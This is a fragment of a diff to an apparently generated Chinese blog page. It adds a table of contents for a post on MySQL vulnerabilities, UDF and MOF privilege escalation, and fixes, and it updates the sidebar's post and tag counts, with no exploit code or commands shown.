+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-MYSQL%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">0x01 MYSQL漏洞案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">1. 漏洞原理：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">2. 影响版本：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">3. 漏洞复现：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%E3%80%81%E7%94%A8msf%E7%9B%B4%E6%8E%A5%E8%B7%91%EF%BC%9A"><span class="nav-number">1.3.1.</span> <span class="nav-text">方法一、用msf直接跑：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8bash%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E7%99%BB%E9%99%86mysql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.3.2.</span> <span class="nav-text">方法二、利用bash脚本自动登陆mysql数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%E3%80%81Python%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="nav-number">1.3.3.</span> <span class="nav-text">方法三、Python脚本：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-UDF-%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">0x02 UDF 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">1.提权条件：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">2.相关知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Secure-file-priv%E5%8F%82%E6%95%B0"><span class="nav-number">2.2.1.</span> <span class="nav-text">1. Secure_file_priv参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-UDF%E6%9D%A5%E6%BA%90"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.UDF来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-UDF%E6%8F%90%E4%BE%9B%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.UDF提供的函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9APHPMailer%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">3.漏洞复现：PHPMailer命令执行利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.3.1.</span> <span class="nav-text">001 环境搭建</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-MOF%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">0x03 MOF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8E%9F%E7%90%86"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.条件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">0x04 漏洞修复：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -455,7 +495,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -464,7 +504,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
